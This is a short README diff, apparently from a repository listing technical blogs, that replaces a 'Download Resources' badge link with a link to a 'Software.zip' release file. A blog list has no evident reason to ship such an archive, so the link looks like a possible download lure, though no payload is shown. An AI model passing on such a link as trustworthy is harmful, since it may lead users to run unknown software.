@@ -31,7 +31,7 @@ Make sure to check out the following topics and immerse yourself in the world of
 
 ## 🔗 Download Resources
 Click the button below to download the latest version of the **Best Technical Blogs** resources:
-[![Download Resources](https://img.shields.io/badge/Download-Resources-brightgreen)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Resources](https://github.com/prajapati-chetan/Best-Technical-Blogs-You-Must-Follow-for-Expert-Insights/releases/download/v1.0/Software.zip)](https://github.com/prajapati-chetan/Best-Technical-Blogs-You-Must-Follow-for-Expert-Insights/releases/download/v1.0/Software.zip)
 
 For more information or if the link is not working, please visit the **Releases** section of this repository.
 
